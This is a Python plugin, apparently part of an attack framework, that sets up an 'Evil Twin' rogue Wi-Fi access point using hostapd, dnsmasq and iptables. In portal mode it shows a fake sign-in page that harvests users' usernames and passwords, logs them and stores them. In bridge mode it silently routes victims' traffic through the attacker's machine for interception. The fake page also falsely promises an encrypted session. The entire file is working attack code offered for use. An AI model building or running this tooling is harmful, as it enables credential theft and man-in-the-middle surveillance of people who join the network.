from core.plugin_manager import BasePlugin
import asyncio
import http.server
import os
import subprocess
import threading
import time
import urllib.parse

_HOSTAPD_TMPL = """\
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
wpa=0
ignore_broadcast_ssid=0
"""

_DNSMASQ_TMPL = """\
interface={iface}
dhcp-range={dhcp_start},{dhcp_end},12h
dhcp-option=3,{gw}
dhcp-option=6,{gw}
address=/#/{gw}
no-resolv
log-queries
"""

_PORTAL_HTML = b"""\
<!DOCTYPE html><html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign In</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0f172a;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:-apple-system,sans-serif}
.card{background:#fff;border-radius:12px;padding:2rem;width:320px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
h2{color:#1e293b;font-size:1.1rem;margin-bottom:1.5rem;text-align:center}
label{display:block;font-size:.75rem;color:#64748b;margin-bottom:.25rem}
input{width:100%;padding:.6rem .75rem;border:1px solid #e2e8f0;border-radius:6px;font-size:.9rem;margin-bottom:1rem}
button{width:100%;padding:.7rem;background:#2563eb;color:#fff;border:none;border-radius:6px;font-size:.9rem;cursor:pointer;font-weight:600}
.foot{text-align:center;font-size:.7rem;color:#94a3b8;margin-top:1rem}
</style></head><body>
<div class="card">
  <h2>Network authentication required</h2>
  <form method="POST" action="/login">
    <label>Email or username</label>
    <input type="text" name="user" autocomplete="username" required>
    <label>Password</label>
    <input type="password" name="pass" autocomplete="current-password" required>
    <button type="submit">Sign in</button>
  </form>
  <p class="foot">Your session will be encrypted after authentication.</p>
</div></body></html>"""

_SUCCESS_HTML = b"""\
<!DOCTYPE html><html><head>
<meta charset="utf-8">
<meta http-equiv="refresh" content="3;url=https://www.google.com">
<title>Connected</title>
<style>body{background:#0f172a;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:sans-serif;color:white}</style>
</head><body><h2>Connected to the internet</h2></body></html>"""


class _PortalHandler(http.server.BaseHTTPRequestHandler):
    plugin = None

    def log_message(self, *args):
        pass

    def _send(self, body: bytes, status: int = 200):
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", len(body))
        self.send_header("Cache-Control", "no-cache, no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        captive_paths = {"/generate_204", "/connectivity-check.html",
                         "/hotspot-detect.html", "/ncsi.txt"}
        if self.path in captive_paths:
            self.send_response(302)
            self.send_header("Location", "http://10.0.0.1/")
            self.end_headers()
        else:
            self._send(_PORTAL_HTML)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length).decode(errors="replace")
        params = dict(urllib.parse.parse_qsl(raw))
        user = params.get("user", "").strip()
        pw = params.get("pass", "").strip()
        if (user or pw) and self.plugin:
            record = {"user": user, "password": pw,
                      "src_ip": self.client_address[0], "ts": time.time()}
            self.plugin.captured_creds.append(record)
            self.plugin.log_event(
                f"PORTAL CRED: {user}:{pw} from {self.client_address[0]}", "HARVEST"
            )
            if self.plugin.target_store:
                self.plugin.target_store.save_credential("RogueAP:Portal", f"{user}:{pw}")
        self._send(_SUCCESS_HTML)


class RogueAPPlugin(BasePlugin):
    """
    Evil Twin AP with two modes:
      portal  — captive portal that harvests credentials from connecting clients
      bridge  — transparent NAT bridge, silently routes client traffic through
                the attacker machine (feeds Sniffer / Proxy plugins)
    Requires: hostapd, dnsmasq, iptables, ip (iproute2)
    """

    def __init__(self):
        self.running = False
        self.captured_creds: list[dict] = []
        self._procs: list[subprocess.Popen] = []
        self._portal_server: http.server.HTTPServer | None = None
        self._portal_thread: threading.Thread | None = None
        self._iface_ap = "wlan0"
        self._iface_wan = "eth0"
        self._gw = "10.0.0.1"
        self._mode = "portal"

    @property
    def name(self) -> str:
        return "Rogue-AP"

    @property
    def description(self) -> str:
        return "Evil Twin AP: captive-portal credential harvester or transparent MITM bridge"

    async def start(
        self,
        ssid: str = "Free_WiFi",
        channel: int = 6,
        iface_ap: str = "wlan0",
        iface_wan: str = "eth0",
        mode: str = "portal",
        gw: str = "10.0.0.1",
    ):
        if self.running:
            return
        self._iface_ap = iface_ap
        self._iface_wan = iface_wan
        self._mode = mode
        self._gw = gw
        self.running = True

        await asyncio.to_thread(self._configure_iface)
        await asyncio.to_thread(self._launch_hostapd, ssid, channel)
        await asyncio.to_thread(self._launch_dnsmasq)
        await asyncio.to_thread(self._setup_routing)
        if mode == "portal":
            self._launch_portal()

        self.log_event(f"Rogue AP '{ssid}' live on {iface_ap} ch{channel} [{mode}]", "START")

    async def stop(self):
        self.running = False
        if self._portal_server:
            self._portal_server.shutdown()
        for p in self._procs:
            try:
                p.terminate()
            except Exception:
                pass
        self._procs.clear()
        await asyncio.to_thread(self._teardown_routing)
        self.log_event("Rogue AP stopped. Routing restored.", "STOP")

    # ── interface ──────────────────────────────────────────────────────────────

    def _configure_iface(self):
        _sh(["ip", "link", "set", self._iface_ap, "up"])
        _sh(["ip", "addr", "flush", "dev", self._iface_ap])
        _sh(["ip", "addr", "add", f"{self._gw}/24", "dev", self._iface_ap])

    # ── hostapd ────────────────────────────────────────────────────────────────

    def _launch_hostapd(self, ssid: str, channel: int):
        conf = _HOSTAPD_TMPL.format(iface=self._iface_ap, ssid=ssid, channel=channel)
        path = f"/tmp/moonkeep_hostapd_{self._iface_ap}.conf"
        with open(path, "w") as f:
            f.write(conf)
        proc = subprocess.Popen(
            ["hostapd", path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        self._procs.append(proc)
        time.sleep(2)

    # ── dnsmasq ────────────────────────────────────────────────────────────────

    def _launch_dnsmasq(self):
        base = self._gw.rsplit(".", 1)[0]
        conf = _DNSMASQ_TMPL.format(
            iface=self._iface_ap,
            dhcp_start=f"{base}.10",
            dhcp_end=f"{base}.100",
            gw=self._gw,
        )
        path = f"/tmp/moonkeep_dnsmasq_{self._iface_ap}.conf"
        with open(path, "w") as f:
            f.write(conf)
        proc = subprocess.Popen(
            ["dnsmasq", "--no-daemon", f"--conf-file={path}"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        self._procs.append(proc)

    # ── iptables routing ───────────────────────────────────────────────────────

    def _setup_routing(self):
        _sh(["sysctl", "-w", "net.ipv4.ip_forward=1"])
        if self._mode == "bridge":
            # Full NAT: AP clients get real internet, traffic flows through us
            _sh(["iptables", "-t", "nat", "-A", "POSTROUTING",
                 "-o", self._iface_wan, "-j", "MASQUERADE"])
            _sh(["iptables", "-A", "FORWARD", "-i", self._iface_ap,
                 "-o", self._iface_wan, "-j", "ACCEPT"])
            _sh(["iptables", "-A", "FORWARD", "-i", self._iface_wan,
                 "-o", self._iface_ap, "-m", "state",
                 "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
        else:
            # Captive portal: redirect HTTP to our server, block HTTPS
            _sh(["iptables", "-t", "nat", "-A", "PREROUTING",
                 "-i", self._iface_ap, "-p", "tcp", "--dport", "80",
                 "-j", "DNAT", "--to-destination", f"{self._gw}:8081"])
            _sh(["iptables", "-A", "FORWARD", "-i", self._iface_ap,
                 "-p", "tcp", "--dport", "443", "-j", "REJECT"])

    def _teardown_routing(self):
        _sh(["iptables", "-t", "nat", "-F"])
        _sh(["iptables", "-F", "FORWARD"])
        _sh(["sysctl", "-w", "net.ipv4.ip_forward=0"])

    # ── captive portal ─────────────────────────────────────────────────────────

    def _launch_portal(self):
        _PortalHandler.plugin = self
        self._portal_server = http.server.HTTPServer(
            ("0.0.0.0", 8081), _PortalHandler
        )
        self._portal_thread = threading.Thread(
            target=self._portal_server.serve_forever, daemon=True
        )
        self._portal_thread.start()
        self.log_event("Captive portal listening on :8081", "PORTAL")


def _sh(cmd: list[str]):
    try:
        subprocess.run(cmd, check=False, capture_output=True)
    except FileNotFoundError:
        pass
